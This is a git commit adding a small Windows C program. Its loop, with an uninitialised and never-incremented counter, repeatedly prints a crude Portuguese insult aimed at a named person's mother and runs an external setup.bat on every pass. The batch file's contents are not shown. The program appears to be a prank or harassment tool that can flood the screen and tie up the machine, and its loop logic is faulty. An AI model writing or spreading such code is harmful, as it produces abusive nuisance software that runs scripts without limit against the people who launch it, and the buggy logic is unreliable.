afda5d3549d46623a785561e27f13ae89a579349
Felipe <123624143+LESS15@users.noreply.github.com>
2023-03-05 13:21:54 -0300

    Add files via upload

---
+++ main.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <conio.h>
+
+int main() {
+	int i;
+	while(i < 20000) {
+	printf("Mae do PH e uma puta\n");
+	system("setup.bat");
+	}
+	return 0;
+}
